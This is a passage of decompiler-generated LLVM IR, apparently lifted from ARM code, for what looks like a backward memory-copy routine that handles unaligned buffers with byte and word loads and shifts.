dec_label_pc_149a0.loopexit:                      ; preds = %dec_label_pc_14988
  %v4_14998 = sub i32 31, %v0_14998
  %v5_14998 = and i32 %v4_14998, %v0_14998
  %v6_14998 = icmp slt i32 %v5_14998, 0
  %v7_14998 = icmp slt i32 %v2_14998, 0
  store i1 %v6_14998, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14998, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_149a0

dec_label_pc_149a0:                               ; preds = %dec_label_pc_149a0.loopexit, %dec_label_pc_1497c
  %v6_149a8 = phi i32 [ %v1_14994, %dec_label_pc_149a0.loopexit ], [ %v0_1498c37, %dec_label_pc_1497c ]
  %v0_149b0.pr = phi i32 [ %v2_14998, %dec_label_pc_149a0.loopexit ], [ %v2_14980, %dec_label_pc_1497c ]
  %v4_149a0 = add i32 %v0_149b0.pr, 16
  %v6_149a0 = sub i32 0, %v0_149b0.pr
  %v7_149a0 = and i32 %v4_149a0, %v6_149a0
  %v8_149a0 = icmp slt i32 %v7_149a0, 0
  store i1 %v8_149a0, i1* %cpsr_v.global-to-local, align 1
  %v9_149a0 = icmp slt i32 %v4_149a0, 0
  store i1 %v9_149a0, i1* %cpsr_n.global-to-local, align 1
  %v10_149a0 = icmp eq i32 %v4_149a0, 0
  store i1 %v10_149a0, i1* %cpsr_z.global-to-local, align 1
  %v5_149a4 = icmp slt i32 %v0_149b0.pr, -16
  br i1 %v5_149a4, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_149a0
  %v6_149a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_149a4 = add i32 %v6_149a4, -4
  %v8_149a4 = inttoptr i32 %v7_149a4 to i32*
  %v9_149a4 = load i32, i32* %v8_149a4, align 4
  store i32 %v9_149a4, i32* @r3, align 4
  %v10_149a4 = add i32 %v6_149a4, -8
  %v11_149a4 = inttoptr i32 %v10_149a4 to i32*
  %v12_149a4 = load i32, i32* %v11_149a4, align 4
  store i32 %v12_149a4, i32* %r4.global-to-local, align 4
  %v13_149a4 = add i32 %v6_149a4, -12
  %v14_149a4 = inttoptr i32 %v13_149a4 to i32*
  %v15_149a4 = load i32, i32* %v14_149a4, align 4
  store i32 %v15_149a4, i32* @ip, align 4
  %v16_149a4 = add i32 %v6_149a4, -16
  %v17_149a4 = inttoptr i32 %v16_149a4 to i32*
  %v18_149a4 = load i32, i32* %v17_149a4, align 4
  store i32 %v18_149a4, i32* %lr.global-to-local, align 4
  store i32 %v16_149a4, i32* %r1.global-to-local, align 4
  %v7_149a8 = add i32 %v6_149a8, -16
  %v8_149a8 = inttoptr i32 %v7_149a8 to i32*
  store i32 %v9_149a4, i32* %v8_149a8, align 4
  %v10_149a8 = add i32 %v6_149a8, -12
  %v11_149a8 = inttoptr i32 %v10_149a8 to i32*
  %v12_149a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_149a8, i32* %v11_149a8, align 4
  %v13_149a8 = add i32 %v6_149a8, -8
  %v14_149a8 = inttoptr i32 %v13_149a8 to i32*
  %v15_149a8 = load i32, i32* @ip, align 4
  store i32 %v15_149a8, i32* %v14_149a8, align 4
  %v16_149a8 = add i32 %v6_149a8, -4
  %v17_149a8 = inttoptr i32 %v16_149a8 to i32*
  %v18_149a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_149a8, i32* %v17_149a8, align 4
  store i32 %v7_149a8, i32* %r0.global-to-local, align 4
  %v6_149ac = load i32, i32* %r2.global-to-local, align 4
  %v7_149ac = add i32 %v6_149ac, -16
  store i32 %v7_149ac, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_149a0, %bb148
  %v6_149b8 = phi i32 [ %v7_149a8, %bb148 ], [ %v6_149a8, %dec_label_pc_149a0 ]
  %v0_149b0 = phi i32 [ %v7_149ac, %bb148 ], [ %v0_149b0.pr, %dec_label_pc_149a0 ]
  %v4_149b0 = add i32 %v0_149b0, 20
  store i32 %v4_149b0, i32* %r2.global-to-local, align 4
  %v6_149b0 = sub i32 0, %v0_149b0
  %v7_149b0 = and i32 %v4_149b0, %v6_149b0
  %v8_149b0 = icmp slt i32 %v7_149b0, 0
  store i1 %v8_149b0, i1* %cpsr_v.global-to-local, align 1
  %v9_149b0 = icmp slt i32 %v4_149b0, 0
  store i1 %v9_149b0, i1* %cpsr_n.global-to-local, align 1
  %v10_149b0 = icmp eq i32 %v4_149b0, 0
  store i1 %v10_149b0, i1* %cpsr_z.global-to-local, align 1
  %v5_149b4 = icmp slt i32 %v0_149b0, -20
  br i1 %v5_149b4, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_149b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_149b4 = add i32 %v6_149b4, -4
  %v8_149b4 = inttoptr i32 %v7_149b4 to i32*
  %v9_149b4 = load i32, i32* %v8_149b4, align 4
  store i32 %v9_149b4, i32* @r3, align 4
  %v10_149b4 = add i32 %v6_149b4, -8
  %v11_149b4 = inttoptr i32 %v10_149b4 to i32*
  %v12_149b4 = load i32, i32* %v11_149b4, align 4
  store i32 %v12_149b4, i32* @ip, align 4
  %v13_149b4 = add i32 %v6_149b4, -12
  %v14_149b4 = inttoptr i32 %v13_149b4 to i32*
  %v15_149b4 = load i32, i32* %v14_149b4, align 4
  store i32 %v15_149b4, i32* %lr.global-to-local, align 4
  store i32 %v13_149b4, i32* %r1.global-to-local, align 4
  %v7_149b8 = add i32 %v6_149b8, -12
  %v8_149b8 = inttoptr i32 %v7_149b8 to i32*
  store i32 %v9_149b4, i32* %v8_149b8, align 4
  %v10_149b8 = add i32 %v6_149b8, -8
  %v11_149b8 = inttoptr i32 %v10_149b8 to i32*
  %v12_149b8 = load i32, i32* @ip, align 4
  store i32 %v12_149b8, i32* %v11_149b8, align 4
  %v13_149b8 = add i32 %v6_149b8, -4
  %v14_149b8 = inttoptr i32 %v13_149b8 to i32*
  %v15_149b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_149b8, i32* %v14_149b8, align 4
  store i32 %v7_149b8, i32* %r0.global-to-local, align 4
  %v6_149bc = load i32, i32* %r2.global-to-local, align 4
  %v7_149bc = add i32 %v6_149bc, -12
  store i32 %v7_149bc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_149dc45 = phi i32 [ %v6_149b8, %.thread2 ], [ %v7_149b8, %bb149 ]
  %v0_149c443 = phi i32 [ %v4_149b0, %.thread2 ], [ %v7_149bc, %bb149 ]
  %v2_149c0 = load i8*, i8** %stack_var_-8, align 4
  %v3_149c0 = ptrtoint i8* %v2_149c0 to i32
  store i32 %v3_149c0, i32* @r4, align 4
  store i32 %v8_1497c, i32* @lr, align 4
  br label %dec_label_pc_149c4

dec_label_pc_149c4:                               ; preds = %dec_label_pc_14974, %.thread4
  %v7_149d4 = phi i32 [ %v0_1498c37, %dec_label_pc_14974 ], [ %v6_149dc45, %.thread4 ]
  %v0_149c4 = phi i32 [ %v2_14974, %dec_label_pc_14974 ], [ %v0_149c443, %.thread4 ]
  %v2_149c4 = add i32 %v0_149c4, 8
  store i32 %v2_149c4, i32* %r2.global-to-local, align 4
  %v4_149c4 = sub i32 0, %v0_149c4
  %v5_149c4 = and i32 %v2_149c4, %v4_149c4
  %v6_149c4 = icmp slt i32 %v5_149c4, 0
  store i1 %v6_149c4, i1* %cpsr_v.global-to-local, align 1
  %v7_149c4 = icmp slt i32 %v2_149c4, 0
  store i1 %v7_149c4, i1* %cpsr_n.global-to-local, align 1
  %v8_149c4 = icmp eq i32 %v2_149c4, 0
  store i1 %v8_149c4, i1* %cpsr_z.global-to-local, align 1
  %v5_149c8 = icmp slt i32 %v0_149c4, -8
  br i1 %v5_149c8, label %bb151, label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_149c4
  %v6_149cc = add i32 %v0_149c4, 4
  store i32 %v6_149cc, i32* %r2.global-to-local, align 4
  %v8_149cc = sub i32 -5, %v0_149c4
  %v9_149cc = and i32 %v8_149cc, %v2_149c4
  %v10_149cc = icmp slt i32 %v9_149cc, 0
  store i1 %v10_149cc, i1* %cpsr_v.global-to-local, align 1
  %v11_149cc = icmp slt i32 %v6_149cc, 0
  store i1 %v11_149cc, i1* %cpsr_n.global-to-local, align 1
  %v12_149cc = icmp eq i32 %v2_149c4, 4
  store i1 %v12_149cc, i1* %cpsr_z.global-to-local, align 1
  %v5_149d0 = icmp slt i32 %v2_149c4, 4
  %v6_149d0 = load i32, i32* %r1.global-to-local, align 4
  %v7_149d0 = add i32 %v6_149d0, -4
  %v8_149d0 = inttoptr i32 %v7_149d0 to i32*
  %v9_149d0 = load i32, i32* %v8_149d0, align 4
  store i32 %v9_149d0, i32* @r3, align 4
  br i1 %v5_149d0, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_149cc
  store i32 %v7_149d0, i32* %r1.global-to-local, align 4
  %v8_149d4 = add i32 %v7_149d4, -4
  %v9_149d4 = inttoptr i32 %v8_149d4 to i32*
  store i32 %v9_149d0, i32* %v9_149d4, align 4
  %v10_149d4 = load i32, i32* %r0.global-to-local, align 4
  %v11_149d4 = add i32 %v10_149d4, -4
  store i32 %v11_149d4, i32* %r0.global-to-local, align 4
  %v0_149e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_149cc
  %v10_149d8 = add i32 %v6_149d0, -8
  %v11_149d8 = inttoptr i32 %v10_149d8 to i32*
  %v12_149d8 = load i32, i32* %v11_149d8, align 4
  store i32 %v12_149d8, i32* @ip, align 4
  store i32 %v10_149d8, i32* %r1.global-to-local, align 4
  %v7_149dc = add i32 %v7_149d4, -8
  %v8_149dc = inttoptr i32 %v7_149dc to i32*
  store i32 %v9_149d0, i32* %v8_149dc, align 4
  %v10_149dc = add i32 %v7_149d4, -4
  %v11_149dc = inttoptr i32 %v10_149dc to i32*
  %v12_149dc = load i32, i32* @ip, align 4
  store i32 %v12_149dc, i32* %v11_149dc, align 4
  store i32 %v7_149dc, i32* %r0.global-to-local, align 4
  %v6_149e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_149e0 = add i32 %v6_149e0, -4
  store i32 %v7_149e0, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %dec_label_pc_149c4, %dec_label_pc_14954, %.thread14, %dec_label_pc_14b88, %dec_label_pc_14b1c, %dec_label_pc_14ab0, %bb150
  %v2_149e8 = phi i32 [ %v11_149d4, %.thread8 ], [ %v7_149d4, %dec_label_pc_149c4 ], [ %v2_14958, %dec_label_pc_14954 ], [ %v0_14a8020, %.thread14 ], [ %v2_149f453, %dec_label_pc_14b88 ], [ %v2_149f452, %dec_label_pc_14b1c ], [ %v2_149f451, %dec_label_pc_14ab0 ], [ %v7_149dc, %bb150 ]
  %v0_149e4 = phi i32 [ %v0_149e4.pre, %.thread8 ], [ %v2_149c4, %dec_label_pc_149c4 ], [ %v2_1495c, %dec_label_pc_14954 ], [ %v2_14a28, %.thread14 ], [ %v0_149e449, %dec_label_pc_14b88 ], [ %v0_149e448, %dec_label_pc_14b1c ], [ %v0_149e447, %dec_label_pc_14ab0 ], [ %v7_149e0, %bb150 ]
  %v1_149e4 = add i32 %v0_149e4, 4
  store i32 %v1_149e4, i32* @r2, align 4
  %v3_149e4 = sub i32 0, %v0_149e4
  %v4_149e4 = and i32 %v1_149e4, %v3_149e4
  %v5_149e4 = icmp slt i32 %v4_149e4, 0
  store i1 %v5_149e4, i1* %cpsr_v.global-to-local, align 1
  %v6_149e4 = icmp slt i32 %v1_149e4, 0
  store i1 %v6_149e4, i1* %cpsr_n.global-to-local, align 1
  %v7_149e4 = icmp eq i32 %v1_149e4, 0
  store i1 %v7_149e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_149e4, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_149ec = add i32 %v0_149e4, 2
  %v3_149ec = sub i32 -3, %v0_149e4
  %v4_149ec = and i32 %v3_149ec, %v1_149e4
  %v5_149ec = icmp slt i32 %v4_149ec, 0
  store i1 %v5_149ec, i1* %cpsr_v.global-to-local, align 1
  %v6_149ec = icmp slt i32 %v1_149ec, 0
  store i1 %v6_149ec, i1* %cpsr_n.global-to-local, align 1
  %v7_149ec = icmp eq i32 %v1_149e4, 2
  store i1 %v7_149ec, i1* %cpsr_z.global-to-local, align 1
  %v0_149f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_149f0 = add i32 %v0_149f0, -1
  %v2_149f0 = inttoptr i32 %v1_149f0 to i8*
  %v3_149f0 = load i8, i8* %v2_149f0, align 1
  %v4_149f0 = zext i8 %v3_149f0 to i32
  store i32 %v4_149f0, i32* @r3, align 4
  store i32 %v1_149f0, i32* %r1.global-to-local, align 4
  %v3_149f4 = add i32 %v2_149e8, -1
  %v4_149f4 = inttoptr i32 %v3_149f4 to i8*
  store i8 %v3_149f0, i8* %v4_149f4, align 1
  %v5_149f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_149f4 = add i32 %v5_149f4, -1
  store i32 %v6_149f4, i32* %r0.global-to-local, align 4
  %v0_149f8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_149f8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_149f8 = xor i1 %v0_149f8, %v1_149f8
  br i1 %v2_149f8, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_149f8 = load i32, i32* %r1.global-to-local, align 4
  %v4_149f8 = add i32 %v3_149f8, -1
  %v5_149f8 = inttoptr i32 %v4_149f8 to i8*
  %v6_149f8 = load i8, i8* %v5_149f8, align 1
  %v7_149f8 = zext i8 %v6_149f8 to i32
  store i32 %v7_149f8, i32* @r3, align 4
  store i32 %v4_149f8, i32* %r1.global-to-local, align 4
  %v6_149fc = add i32 %v5_149f4, -2
  %v7_149fc = inttoptr i32 %v6_149fc to i8*
  store i8 %v6_149f8, i8* %v7_149fc, align 1
  %v8_149fc = load i32, i32* %r0.global-to-local, align 4
  %v9_149fc = add i32 %v8_149fc, -1
  store i32 %v9_149fc, i32* %r0.global-to-local, align 4
  %v1_14a00.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14a00.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_14a04 = phi i32 [ %v9_149fc, %bb153 ], [ %v6_149f4, %bb152 ]
  %v2_14a04 = phi i1 [ %v2_14a00.pre, %bb153 ], [ %v1_149f8, %bb152 ]
  %v1_14a04 = phi i1 [ %v1_14a00.pre, %bb153 ], [ %v0_149f8, %bb152 ]
  %v0_14a00 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14a00 = xor i1 %v2_14a04, %v1_14a04
  %v4_14a00 = or i1 %v0_14a00, %v3_14a00
  br i1 %v4_14a00, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_14a00 = load i32, i32* %r1.global-to-local, align 4
  %v6_14a00 = add i32 %v5_14a00, -1
  %v7_14a00 = inttoptr i32 %v6_14a00 to i8*
  %v8_14a00 = load i8, i8* %v7_14a00, align 1
  %v9_14a00 = zext i8 %v8_14a00 to i32
  store i32 %v9_14a00, i32* @r3, align 4
  store i32 %v6_14a00, i32* %r1.global-to-local, align 4
  %v8_14a04 = add i32 %v7_14a04, -1
  %v9_14a04 = inttoptr i32 %v8_14a04 to i8*
  store i8 %v8_14a00, i8* %v9_14a04, align 1
  %v10_14a04 = load i32, i32* %r0.global-to-local, align 4
  %v11_14a04 = add i32 %v10_14a04, -1
  store i32 %v11_14a04, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_14964
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14a0c = icmp eq i32 %v1_14964, 1
  store i1 %v8_14a0c, i1* %cpsr_n.global-to-local, align 1
  %v9_14a0c = icmp eq i32 %v1_14964, 2
  store i1 %v9_14a0c, i1* %cpsr_z.global-to-local, align 1
  %v1_14a10 = add i32 %v2_14954, -1
  %v2_14a10 = inttoptr i32 %v1_14a10 to i8*
  %v3_14a10 = load i8, i8* %v2_14a10, align 1
  %v4_14a10 = zext i8 %v3_14a10 to i32
  store i32 %v4_14a10, i32* @r3, align 4
  store i32 %v1_14a10, i32* %r1.global-to-local, align 4
  %v3_14a14 = add i32 %v2_14958, -1
  %v4_14a14 = inttoptr i32 %v3_14a14 to i8*
  store i8 %v3_14a10, i8* %v4_14a14, align 1
  %v5_14a14 = load i32, i32* %r0.global-to-local, align 4
  %v6_14a14 = add i32 %v5_14a14, -1
  store i32 %v6_14a14, i32* %r0.global-to-local, align 4
  br i1 %v8_14a0c, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_14a0c
  %v6_14a18 = load i32, i32* %r1.global-to-local, align 4
  %v7_14a18 = add i32 %v6_14a18, -1
  %v8_14a18 = inttoptr i32 %v7_14a18 to i8*
  %v9_14a18 = load i8, i8* %v8_14a18, align 1
  %v10_14a18 = zext i8 %v9_14a18 to i32
  store i32 %v10_14a18, i32* @r3, align 4
  store i32 %v7_14a18, i32* %r1.global-to-local, align 4
  %v9_14a1c = add i32 %v5_14a14, -2
  %v10_14a1c = inttoptr i32 %v9_14a1c to i8*
  store i8 %v9_14a18, i8* %v10_14a1c, align 1
  %v11_14a1c = load i32, i32* %r0.global-to-local, align 4
  %v12_14a1c = add i32 %v11_14a1c, -1
  store i32 %v12_14a1c, i32* %r0.global-to-local, align 4
  br i1 %v9_14a0c, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_14a20 = load i32, i32* %r1.global-to-local, align 4
  %v9_14a20 = add i32 %v8_14a20, -1
  %v10_14a20 = inttoptr i32 %v9_14a20 to i8*
  %v11_14a20 = load i8, i8* %v10_14a20, align 1
  %v12_14a20 = zext i8 %v11_14a20 to i32
  store i32 %v12_14a20, i32* @r3, align 4
  store i32 %v9_14a20, i32* %r1.global-to-local, align 4
  %v11_14a24 = add i32 %v11_14a1c, -2
  %v12_14a24 = inttoptr i32 %v11_14a24 to i8*
  store i8 %v11_14a20, i8* %v12_14a24, align 1
  %v13_14a24 = load i32, i32* %r0.global-to-local, align 4
  %v14_14a24 = add i32 %v13_14a24, -1
  store i32 %v14_14a24, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_14a0c, %bb156
  %v0_14a8020 = phi i32 [ %v12_14a1c, %bb155 ], [ %v6_14a14, %dec_label_pc_14a0c ], [ %v14_14a24, %bb156 ]
  %v0_14a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a28 = load i32, i32* @ip, align 4
  %v2_14a28 = sub i32 %v0_14a28, %v1_14a28
  store i32 %v2_14a28, i32* %r2.global-to-local, align 4
  %v4_14a28 = xor i32 %v1_14a28, %v0_14a28
  %v5_14a28 = xor i32 %v2_14a28, %v0_14a28
  %v6_14a28 = and i32 %v5_14a28, %v4_14a28
  %v7_14a28 = icmp slt i32 %v6_14a28, 0
  store i1 %v7_14a28, i1* %cpsr_v.global-to-local, align 1
  %v8_14a28 = icmp slt i32 %v2_14a28, 0
  store i1 %v8_14a28, i1* %cpsr_n.global-to-local, align 1
  %v9_14a28 = icmp eq i32 %v0_14a28, %v1_14a28
  store i1 %v9_14a28, i1* %cpsr_z.global-to-local, align 1
  %v5_14a2c = icmp slt i32 %v0_14a28, %v1_14a28
  br i1 %v5_14a2c, label %bb151, label %dec_label_pc_14a30

dec_label_pc_14a30:                               ; preds = %.thread14
  %v0_14a30 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a30 = urem i32 %v0_14a30, 4
  store i32 %v1_14a30, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14a30 = icmp eq i32 %v1_14a30, 0
  store i1 %v2_14a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a30, label %dec_label_pc_14974, label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %dec_label_pc_1496c, %dec_label_pc_14a30
  %v0_14a8019 = phi i32 [ %v2_14958, %dec_label_pc_1496c ], [ %v0_14a8020, %dec_label_pc_14a30 ]
  %v0_14b2c = phi i32 [ %v2_1495c, %dec_label_pc_1496c ], [ %v2_14a28, %dec_label_pc_14a30 ]
  %v0_14a38 = phi i32 [ %v2_14954, %dec_label_pc_1496c ], [ %v0_14a30, %dec_label_pc_14a30 ]
  %v0_14a40 = phi i32 [ %v1_1496c, %dec_label_pc_1496c ], [ %v1_14a30, %dec_label_pc_14a30 ]
  %v1_14a38 = and i32 %v0_14a38, -4
  store i32 %v1_14a38, i32* %r1.global-to-local, align 4
  %v1_14a3c = inttoptr i32 %v1_14a38 to i32*
  %v2_14a3c = load i32, i32* %v1_14a3c, align 4
  store i32 %v2_14a3c, i32* @r3, align 4
  %v7_14a40 = icmp ult i32 %v0_14a40, 2
  %v2_14b24 = add i32 %v0_14b2c, -12
  %v4_14b24 = sub i32 11, %v0_14b2c
  %v5_14b24 = and i32 %v4_14b24, %v0_14b2c
  %v6_14b24 = icmp slt i32 %v5_14b24, 0
  store i1 %v6_14b24, i1* %cpsr_v.global-to-local, align 1
  %v7_14b24 = icmp slt i32 %v2_14b24, 0
  store i1 %v7_14b24, i1* %cpsr_n.global-to-local, align 1
  %v8_14b24 = icmp eq i32 %v0_14b2c, 12
  store i1 %v8_14b24, i1* %cpsr_z.global-to-local, align 1
  %v5_14b28 = icmp slt i32 %v0_14b2c, 12
  br i1 %v7_14a40, label %dec_label_pc_14b24, label %dec_label_pc_14a48

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a38
  %v8_14a40 = icmp eq i32 %v0_14a40, 2
  br i1 %v8_14a40, label %dec_label_pc_14ab8, label %dec_label_pc_14a4c

dec_label_pc_14a4c:                               ; preds = %dec_label_pc_14a48
  br i1 %v5_14b28, label %dec_label_pc_14a98, label %dec_label_pc_14a54

dec_label_pc_14a54:                               ; preds = %dec_label_pc_14a4c
  store i32 %v2_14b24, i32* %r2.global-to-local, align 4
  %v3_14a58 = load i32, i32* @r4, align 4
  store i32 %v3_14a58, i32* %stack_var_-12, align 4
  %v6_14a58 = load i32, i32* @r5, align 4
  %v8_14a58 = inttoptr i32 %v6_14a58 to i8*
  store i8* %v8_14a58, i8** %stack_var_-8, align 4
  %v11_14a58 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge, %dec_label_pc_14a54
  %v0_14a80 = phi i32 [ %v1_14a80, %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge ], [ %v0_14a8019, %dec_label_pc_14a54 ]
  %v0_14a60 = phi i32 [ %v0_14a60.pre, %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge ], [ %v1_14a38, %dec_label_pc_14a54 ]
  %v0_14a5c = phi i32 [ %v0_14a5c.pre, %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge ], [ %v2_14a3c, %dec_label_pc_14a54 ]
  %v3_14a5c = mul i32 %v0_14a5c, 256
  store i32 %v3_14a5c, i32* %lr.global-to-local, align 4
  %v1_14a60 = add i32 %v0_14a60, -4
  %v2_14a60 = inttoptr i32 %v1_14a60 to i32*
  %v3_14a60 = load i32, i32* %v2_14a60, align 4
  store i32 %v3_14a60, i32* @r3, align 4
  %v4_14a60 = add i32 %v0_14a60, -8
  %v5_14a60 = inttoptr i32 %v4_14a60 to i32*
  %v6_14a60 = load i32, i32* %v5_14a60, align 4
  store i32 %v6_14a60, i32* %r4.global-to-local, align 4
  %v7_14a60 = add i32 %v0_14a60, -12
  %v8_14a60 = inttoptr i32 %v7_14a60 to i32*
  %v9_14a60 = load i32, i32* %v8_14a60, align 4
  store i32 %v9_14a60, i32* %r5.global-to-local, align 4
  %v10_14a60 = add i32 %v0_14a60, -16
  %v11_14a60 = inttoptr i32 %v10_14a60 to i32*
  %v12_14a60 = load i32, i32* %v11_14a60, align 4
  store i32 %v10_14a60, i32* %r1.global-to-local, align 4
  %v4_14a64 = udiv i32 %v12_14a60, 16777216
  %v5_14a64 = or i32 %v4_14a64, %v3_14a5c
  store i32 %v5_14a64, i32* %lr.global-to-local, align 4
  %v3_14a68 = mul i32 %v12_14a60, 256
  %v4_14a6c = udiv i32 %v9_14a60, 16777216
  %v5_14a6c = or i32 %v3_14a68, %v4_14a6c
  store i32 %v5_14a6c, i32* @ip, align 4
  %v3_14a70 = mul i32 %v9_14a60, 256
  %v4_14a74 = udiv i32 %v6_14a60, 16777216
  %v5_14a74 = or i32 %v3_14a70, %v4_14a74
  store i32 %v5_14a74, i32* %r5.global-to-local, align 4
  %v3_14a78 = mul i32 %v6_14a60, 256
  %v4_14a7c = udiv i32 %v3_14a60, 16777216
  %v5_14a7c = or i32 %v3_14a78, %v4_14a7c
  store i32 %v5_14a7c, i32* %r4.global-to-local, align 4
  %v1_14a80 = add i32 %v0_14a80, -16
  %v2_14a80 = inttoptr i32 %v1_14a80 to i32*
  store i32 %v5_14a7c, i32* %v2_14a80, align 4
  %v4_14a80 = add i32 %v0_14a80, -12
  %v5_14a80 = inttoptr i32 %v4_14a80 to i32*
  %v6_14a80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14a80, i32* %v5_14a80, align 4
  %v7_14a80 = add i32 %v0_14a80, -8
  %v8_14a80 = inttoptr i32 %v7_14a80 to i32*
  %v9_14a80 = load i32, i32* @ip, align 4
  store i32 %v9_14a80, i32* %v8_14a80, align 4
  %v10_14a80 = add i32 %v0_14a80, -4
  %v11_14a80 = inttoptr i32 %v10_14a80 to i32*
  %v12_14a80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14a80, i32* %v11_14a80, align 4
  store i32 %v1_14a80, i32* %r0.global-to-local, align 4
  %v0_14a84 = load i32, i32* %r2.global-to-local, align 4
  %v2_14a84 = add i32 %v0_14a84, -16
  store i32 %v2_14a84, i32* %r2.global-to-local, align 4
  %v6_14a88 = icmp slt i32 %v0_14a84, 16
  br i1 %v6_14a88, label %dec_label_pc_14a8c, label %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge

dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge:  ; preds = %dec_label_pc_14a5c
  %v0_14a5c.pre = load i32, i32* @r3, align 4
  %v0_14a60.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a5c
  %v2_14a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14a8c, i32* @r4, align 4
  %v5_14a8c = load i8*, i8** %stack_var_-8, align 4
  %v6_14a8c = ptrtoint i8* %v5_14a8c to i32
  store i32 %v6_14a8c, i32* @r5, align 4
  store i32 %v11_14a58, i32* @lr, align 4
  %v2_14a90 = add i32 %v0_14a84, -4
  store i32 %v2_14a90, i32* %r2.global-to-local, align 4
  %v4_14a90 = add i32 %v0_14a84, 2147483632
  %v5_14a90 = and i32 %v2_14a90, %v4_14a90
  %v6_14a90 = icmp slt i32 %v5_14a90, 0
  store i1 %v6_14a90, i1* %cpsr_v.global-to-local, align 1
  %v7_14a90 = icmp slt i32 %v2_14a90, 0
  store i1 %v7_14a90, i1* %cpsr_n.global-to-local, align 1
  %v8_14a90 = icmp eq i32 %v2_14a90, 0
  store i1 %v8_14a90, i1* %cpsr_z.global-to-local, align 1
  %v5_14a94 = icmp slt i32 %v2_14a84, -12
  br i1 %v5_14a94, label %dec_label_pc_14ab0, label %dec_label_pc_14a98

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a8c, %dec_label_pc_14a4c, %dec_label_pc_14a98
  %v1_14aa4 = phi i32 [ %v5_14aa4, %dec_label_pc_14a98 ], [ %v1_14a80, %dec_label_pc_14a8c ], [ %v0_14a8019, %dec_label_pc_14a4c ]
  %v0_14a98 = load i32, i32* @r3, align 4
  %v3_14a98 = mul i32 %v0_14a98, 256
  store i32 %v3_14a98, i32* %ip.global-to-local, align 4
  %v0_14a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_14a9c = add i32 %v0_14a9c, -4
  %v2_14a9c = inttoptr i32 %v1_14a9c to i32*
  %v3_14a9c = load i32, i32* %v2_14a9c, align 4
  store i32 %v3_14a9c, i32* @r3, align 4
  store i32 %v1_14a9c, i32* %r1.global-to-local, align 4
  %v4_14aa0 = udiv i32 %v3_14a9c, 16777216
  %v5_14aa0 = or i32 %v4_14aa0, %v3_14a98
  store i32 %v5_14aa0, i32* @ip, align 4
  %v2_14aa4 = add i32 %v1_14aa4, -4
  %v3_14aa4 = inttoptr i32 %v2_14aa4 to i32*
  store i32 %v5_14aa0, i32* %v3_14aa4, align 4
  %v4_14aa4 = load i32, i32* %r0.global-to-local, align 4
  %v5_14aa4 = add i32 %v4_14aa4, -4
  store i32 %v5_14aa4, i32* %r0.global-to-local, align 4
  %v0_14aa8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14aa8 = add i32 %v0_14aa8, -4
  store i32 %v2_14aa8, i32* %r2.global-to-local, align 4
  %v6_14aac = icmp slt i32 %v0_14aa8, 4
  br i1 %v6_14aac, label %dec_label_pc_14ab0.loopexit, label %dec_label_pc_14a98

dec_label_pc_14ab0.loopexit:                      ; preds = %dec_label_pc_14a98
  %v4_14aa8 = sub i32 3, %v0_14aa8
  %v5_14aa8 = and i32 %v4_14aa8, %v0_14aa8
  %v6_14aa8 = icmp slt i32 %v5_14aa8, 0
